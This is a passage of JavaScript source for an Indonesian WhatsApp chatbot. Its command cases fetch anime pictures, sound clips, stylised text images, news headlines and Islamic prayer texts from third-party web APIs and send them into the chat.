                    var coba = await convertSticker(bas64, `𝙍 𝙚 𝙨 𝙩 𝙖 𝙁 𝙫 𝙣 𝙠 𝙮`, `${kls}`)
                    var imageBuffer = new Buffer.from(coba, 'base64');
                    aldi.sendMessage(from,  imageBuffer, MessageType.sticker, {quoted: fkontak})
                    } else {
                    reply('Format Salah!')
                    }
                    await limitAdd(sender)
                    break
				case 'kaneki':
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)  
				    if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=kaneki`, {method: 'get'})
					kan = JSON.parse(JSON.stringify(anu));
					eki =  kan[Math.floor(Math.random() *   kan.length)];
					nye = await getBuffer(eki)
					aldi.sendMessage(from, nye, image, { caption: 'KANEKI-KUN', quoted: fkontak })
					await limitAdd(sender) 
					break 
				case 'touka':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=anime+touka`, {method: 'get'})
					tou = JSON.parse(JSON.stringify(anu));
					ka =  tou[Math.floor(Math.random() *   tou.length)];
					nye = await getBuffer(ka)
					aldi.sendMessage(from, nye, image, { caption: 'TOUKA-CHAN', quoted: fkontak })
					await limitAdd(sender) 
					break 
				case 'rize':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=anime+rize`, {method: 'get'})
					ri = JSON.parse(JSON.stringify(anu));
					ze =  ri[Math.floor(Math.random() *   ri.length)];
					nye = await getBuffer(ze)
					aldi.sendMessage(from, nye, image, { caption: 'RIZE-CHAN', quoted: fkontak })
					await limitAdd(sender) 	
					break 
				case 'aldi':
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=anime+aldi`, {method: 'get'})
					ak = JSON.parse(JSON.stringify(anu));
					ara =  ak[Math.floor(Math.random() *   ak.length)];
					nye = await getBuffer(ara)
					aldi.sendMessage(from, nye, image, { caption: 'aldi-CHAN', quoted: fkontak })
					await limitAdd(sender) 
					break 
				case 'itori':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=anime+itori`, {method: 'get'})
					it = JSON.parse(JSON.stringify(anu));
					ori =  it[Math.floor(Math.random() *   it.length)];
					nye = await getBuffer(ori)
					aldi.sendMessage(from, nye, image, { caption: 'ITORI-CHAN', quoted: fkontak })
					await limitAdd(sender) 
					break
//sound menu by ${lolhuman}				
case 'audio':
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
enol = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound.mp3`)
aldi.sendMessage(from, enol, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio1':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
satu = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound1.mp3`)
aldi.sendMessage(from, satu, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio2':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
dua = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound2.mp3`)
aldi.sendMessage(from, dua, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio3':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
tiga = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound3.mp3`)
aldi.sendMessage(from, tiga, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio4':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
empat = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound4.mp3`)
aldi.sendMessage(from, empat, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio5':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
lima = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound5.mp3`)
aldi.sendMessage(from, lima, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio6':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
enam = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound6.mp3`)
aldi.sendMessage(from, enam, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio7':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
tujuh = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound7.mp3`)
aldi.sendMessage(from, tujuh, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio8':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
lapan = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound8.mp3`)
aldi.sendMessage(from, lapan, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio9':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
bilan = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound9.mp3`)
aldi.sendMessage(from, bilan, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
case 'audio10':
//[â—] case by DappaGanz
if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
reply('[⏳] Sabar Lagi Ngirim Audionya')
puluh = await getBuffer(`https://dappa-result.herokuapp.com/untukbot/sound10.mp3`)
aldi.sendMessage(from, puluh, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: fkontak})
await limitAdd(sender)
break
			//MAKER
			case 'vinta':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
			if (args.length < 1) return reply(aml.wrongf)
					vin = body.slice(7)
					reply (aml.wait)
					vintage = await getBuffer(`https://m.arugaz.my.id/api/textpro/realvintage?text=${vin}`)
					aldi.sendMessage(from, vintage, image, {caption: 'nih anjim ${vin}', quoted: fkontak})
					await limitAdd(sender)
					break
					case 'summer':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(8)
					reply (aml.wait)
					aruga = await getBuffer(`https://arugaz.my.id/api/textpro/sandsummer?text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break
					case 'sandwrite':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(11)
					reply (aml.wait)
					aruga = await getBuffer(`https://arugaz.my.id/api/textpro/sandwrite?text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break 
					
					case 'metaldark':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(11)
					reply (aml.wait)
					aruga = await getBuffer(`https://arugaz.my.id/api/textpro/metaldark?text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break 
					case 'dropwater':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(11)
					reply (aml.wait)
					aruga = await getBuffer(`https://arugaz.my.id/api/textpro/dropwater?text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break 
					case 'skeleton':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = args.join('  ')
					reply (aml.wait)
					aruga = await getBuffer(`https://api.xteam.xyz/textpro/skeleton?text=${aruga}&APIKEY=${xteam}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break 
					case 'avatarhacker':
                    if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(14)
					reply (aml.wait)
					anu = await getBuffer(`https://api.vhtear.com/hacker_avatar?text=${txt}&apikey=${apivhtear}`, {method: 'get'})
					aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'glowmetallic':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(14)
					reply (aml.wait)
					anu = await getBuffer(`https://api.vhtear.com/glow_metallic?text=${txt}&apikey=${apivhtear}`)
					aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'viettel':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(9)
					reply (aml.wait)
					anu = await getBuffer(`https://api.vhtear.com/viettel_text?text=${txt}&apikey=${apivhtear}`)
					aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'matrick':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(9)
					reply (aml.wait)
					anu = await getBuffer(`https://api.vhtear.com/matrix_text?text=${txt}&apikey=${apivhtear}`)
					aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'girlgrafity':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(12)
					txt1 = ct.split("|")[0];
                    txt2 = ct.split("|")[1];
					reply (aml.wait)
					anu = await getBuffer(`https://api.vhtear.com/girl_graffiti?text1=${txt1}&text2=${txt2}&apikey=${apivhtear}`)
					aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'watermaker':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = args.join('  ')
					reply (aml.wait)
					anu = await getBuffer(`https://api.vhtear.com/water_maker?text=${txt}&apikey=aldiGithub`)
					aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'textgoogle':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(11)
					txt1 = ct.split("|")[0];
                    txt2 = ct.split("|")[1];
                    txt3 = ct.split("|")[2];
					reply (aml.wait)
					anu = await getBuffer(`https://api.vhtear.com/googletext?text1=${txt1}&text2=${txt2}&text3=${txt3}&apikey=${apivhtear}`)
					aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'ballon':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(7)
					txt1 = ct.split("|")[0];
                    txt2 = ct.split("|")[1];
					reply (aml.wait)
					anu = await getBuffer(`https://api.vhtear.com/balloonmaker?text1=${txt1}&text2=${txt2}&apikey=${apivhtear}`)
					aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
				
					
					case 'neontext':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = args.join('  ')
					reply (aml.wait)
					aruga = await getBuffer(`https://arugaz.my.id/api/textpro/neontext?text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break 
					
					
					
					case 'bannerlol':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(11)
					reply (aml.wait)
					anu = await getBuffer(`https://lolhuman.herokuapp.com/api/photooxy3/bannerlol?apikey=${lolhuman}&text=${txt}`)
					aldi.sendMessage(from, anu, image, {quoted: ftoko, caption: 'Nih hasilnyaaaa'})
					await limitAdd(sender)
					break
					
					case 'newyearcard':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(13)
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome/newyearcard?apikey=${lolhuman}&text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break
                    case 'breakwall':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(11)
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome/breakwall?apikey=${lolhuman}&text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break
                    case 'glossychrome':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(14)
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/ephoto1/glossychrome?apikey=${lolhuman}&text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break
                    case 'gamekogo':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = args.join('  ')
					reply (aml.wait)
					aruga = await getBuffer(`https://api.vhtear.com/gamekogo?text=${aruga}&apikey=${apivhtear}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break
                    case 'futureneon':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(12)
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome/futureneon?apikey=${lolhuman}&text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break 
                    case 'qrcode':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(8)
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/qrcode?apikey=${lolhuman}&text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break
					case 'quotesmaker':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(13)
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/quotemaker?apikey=${lolhuman}&text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break
           case 'quotesmaker2':
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
                    var gh = body.slice(15)
					var quote = gh.split("|")[0];
					var wm = gh.split("|")[1];
					const pref = `Usage: \n${prefix}quotesmaker2 teks|watermark\n\nEx :\n${prefix}quotesmaker2 ini contoh|bicit`
					if (args.length < 1) return reply(pref)
					reply (aml.wait)
					anu = await fetchJson(`https://lolhuman.herokuapp.com/api/quotemaker2?apikey=${lolhuman}&text=${quote}&author=${wm}`, {method: 'get'})
					anu = await getBuffer(anu.result)
					aldi.sendMessage(from, anu, image, {caption: 'Nih anjim', quoted: fkontak})
					await limitAdd(sender)
					break
                    case 'texttovn':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = args.join('  ')
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/gtts/id?apikey=${lolhuman}&text=${aruga}`)
					aldi.sendMessage(from, aruga, audio, {quoted: ftoko, ptt:true})
					await limitAdd(sender)
					break
                    case 'emojitopng':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(12)
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/smoji/${aruga}?apikey=${lolhuman}`)
					aldi.sendMessage(from, aruga, image, {quoted: fkontak})
					await limitAdd(sender)
					break
                    case 'emojitopng2':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(13)
					reply (aml.wait)
					aruga = await getBuffer(`https://api.xteam.xyz/sticker/emojitopngwhatsapp?emo=${aruga}&APIKEY=${xteam}`)
					aldi.sendMessage(from, aruga, image, {quoted: fkontak})
					await limitAdd(sender)
					break
                    case 'stickersearch':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(15)
					reply (aml.wait)
					aruga = await getBuffer(`https://lolhuman.herokuapp.com/api/stickerwa?apikey=${lolhuman}&query=${aruga}`)
					aldi.sendMessage(from, anu, sticker, {quoted: fkontak})
					await limitAdd(sender)
					break  
                    case 'fflogo':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply(aml.wrongf)
					aruga = body.slice(8)
					reply (aml.wait)
					aruga = await getBuffer(`https://api.vhtear.com/logoff?hero=alok&text=${aruga}&apikey=${apivhtear}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					await limitAdd(sender)
					break
				case 'liputan6': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/news/liputan6?apikey=${onlydev}`)
				teks = '=================\n'
				for (let i of asu.result.data) {
					teks += `Title: : ${i.title}\nLink : ${i.link}\nDate : ${i.isoDate}\nDescription : ${i.description}\n=================\n`
				}
				reply(teks)
				break
		case 'cnnnews': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/news/cnnnews?apikey=${onlydev}`)
				teks = '=================\n'
				for (let i of asu.result.data) {
					teks += `Title: : ${i.title}\nLink : ${i.link}\nContent : ${i.contentSnippet}\nDate : ${i.isoDate}\n=================\n`
				}
				reply(teks)
				break
		case 'republika': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/news/republika?apikey=${onlydev}`)
				teks = '=================\n'
				for (let i of asu.result.data) {
					teks += `Creator: : ${i.creator}\nTitle : ${i.title}\nLink : ${i.link}\nCategori : ${i.categories}\nDescription : ${i.description}\nDate : ${i.isoDate}\n=================\n`
				}
				reply(teks)
				break
		case 'temponews': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/news/temponews?apikey=${onlydev}`)
				teks = '=================\n'
				for (let i of asu.result.data) {
					teks += `Title: : ${i.title}\nLink : ${i.link}\nContent : ${i.content}\nDate : ${i.isoDate}\n=================\n`
				}
				reply(teks)
				break
		case 'kumparannews': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/news/kumpurannews?apikey=${onlydev}`)
				teks = '=================\n'
				for (let i of asu.result.data) {
					teks += `Creator: : ${i.creator}\nTitle : ${i.title}\nLink : ${i.link}\nCategori : ${i.categories}\nDescription : ${i.description}\nDate : ${i.isoDate}\n=================\n`
				}
				reply(teks)
				break
		case 'lazymedia': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				if (args.length < 1) return reply(`mau nyari berita apaan bang?`)
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/news/lazymedia?search=${args.join('  ')}&apikey=${onlydev}`)
				teks = '=================\n'
				for (let i of asu.hasil.result) {
					teks += `Author: : ${i.author}\nTitle : ${i.title}\nTag : ${i.tag}\nTime : ${i.time}\nDescription : ${i.desc}\nKey : ${i.key}\n=================\n`
				}
				reply(teks)
				break
		case 'infohoax': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				if (args.length < 1) return reply(`mau nyari berita apaan bang?`)
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/news/turnbackhoax?page=${body.slice(9)}&apikey=${onlydev}`)
				teks = '=================\n'
				for (let i of asu.hasil.result) {
					teks += `Author: : ${i.author}\nTitle : ${i.title}\nTag : ${i.tag}\nTime : ${i.time}\nDescription : ${i.desc}\nKey : ${i.key}\n=================\n`
				}
				reply(teks)
				break
		case 'resepmakanan': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				if (args.length < 1) return reply(`mau nyari resep makanan apaan bang?`)
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/resepmasakan?q=${body.slice(13)}&apikey=${onlydev}`)
				teks = '=================\n'
				for (let i of asu.hasil.results) {
					teks += `Title : ${i.title}\nKey : ${i.key}\nTime : ${i.times}\nServing : ${i.serving}\nDifficulty : ${i.difficulty}\n=================\n`
				}
				reply(teks)
				break
		case 'doaharian': // Like My Video	
				aldi.updatePresence(from, Presence.composing) 
				reply(`[❕] Loading`)
				asu = await fetchJson(`https://onlydevcity.herokuapp.com/api/muslim/doaharian?apikey=${onlydev}`, {method: 'get'})
				teks = '=================\n'
				for (let i of asu.result.data) {
					teks += `Nama Doa: : ${i.title}\nArab : ${i.arabic}\nLatin : ${i.latin}\nTranslation : ${i.translation}\n=================\n`
				}
				reply(teks)
				break
		case 'niatsholat': // Case By Arga
				reply(`[❕] Loading`)
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/muslim/niatshalat?apikey=${onlydev}`, {method: 'get'})
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Sholat : ${i.name}\nArab : ${i.arabic}\nLatin : ${i.latin}\nTerjemah : ${i.terjemahan}\n=================\n`
				}
				reply(teks.trim())
				break
		case 'bacaansholat': // Case By Arga
				reply(`[❕] Loading`)
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/muslim/bacaanshalat?apikey=${onlydev}`, {method: 'get'})
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Bacaan : ${i.name}\nArab : ${i.arabic}\nLatin : ${i.latin}\nTerjemah : ${i.terjemahan}\n=================\n`
				}
				reply(teks.trim())
				break
		case 'jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join('  ')
                    reply(`[❕] Loading`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break
		case 'kisahnabi': // Like My Video
				reply(`[❕] Loading`)
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/kisahnabi?nabi=${body.slice(11)}&apikey=${onlydev}`)
				kontol7 = await getBuffer(anu.result.nabi.image)
				teks = `HASIL\n\n➸ Nama Nabi : ${anu.result.nabi.nabi}\n➸ Lahir : ${anu.result.nabi.lahir}\n➸ Umur : ${anu.result.nabi.umur}\n➸ Tempat : ${anu.result.nabi.tempat}\n➸ Kisah : ${anu.result.nabi.kisah}`
				aldi.sendMessage(from, kontol7, image, {quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} } }, caption: teks})
				break
		case 'tahlil': // Like My Video
				reply(`[❕] Loading`)
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/muslim/tahlil?apikey=${onlydev}`, {method: 'get'})
				teks = '=================\n'
